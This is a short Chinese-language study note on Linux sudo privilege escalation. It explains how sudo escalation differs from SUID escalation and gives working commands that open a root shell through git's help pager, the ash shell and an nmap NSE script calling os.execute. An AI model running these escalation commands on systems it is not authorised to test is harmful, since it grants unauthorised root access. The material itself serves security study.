**11.sudo提权**
sudo -l 查看哪些命令可以使用sudo
sudo提权和suid提权是两种不同的东西，sudo提权是管理员允许某个用户以root权限或者无需密码执行某些命令，suid提权是程序启动时，进程的euid变成root权限的euid=0，此时这个进程就能够实现root权限，而用户就能通过这个实现提权，git提权实际就是sudo提权的一种

```bash
sudo git help config
!/bin/sh(bash)
#这可以理解成启动某个应用 然后这个应用存在命令执行页面 通过!可以执行命令 比如!ls 
!/bin/bash则是会启动一个bash的shell终端

sudo git -p help 
!/bin/bash(sh)

#ash/csh  一个shell
sudo ash

#nmap

echo 'os.execute("/bin/sh")' >getshell.nse

sudo nmap --script=/home/jens/getshell.nse
注意文件路径用绝对路径还是相对路径，nmap一般在默认脚本目录内找文件，而不是当前目录
```
